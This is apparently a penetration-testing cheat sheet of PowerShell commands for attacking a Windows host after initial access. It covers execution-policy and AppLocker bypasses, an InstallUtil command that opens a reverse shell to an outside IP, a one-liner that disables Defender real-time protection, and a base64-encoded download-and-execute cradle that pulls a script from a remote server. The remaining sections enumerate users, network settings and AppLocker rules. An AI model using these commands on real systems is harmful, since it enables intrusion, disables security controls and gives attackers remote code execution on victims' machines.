```
powershell get-item function:
Get-Process | Where-Object {$_.ProcessName –eq "explorer"}
Get-Process | ? {$_.ProcessName –eq “explorer”} | select Id,Handles
(Get-Process | ? {$_.ProcessName –eq “explorer”}).Id
```

### Bypass
```
PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
$ExecutionContext.SessionState.LanguageMode
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /U c:\temp\psby.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe

```
### Antivirus
```
#Check status
Get-MpComputerStatus
#Disable
Set-MpPreference -DisableRealtimeMonitoring $true
```
### User
```
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
### AppLockerPolicy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

```
### Network
```
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Download & Execute
```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.99.110/shell123.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

```
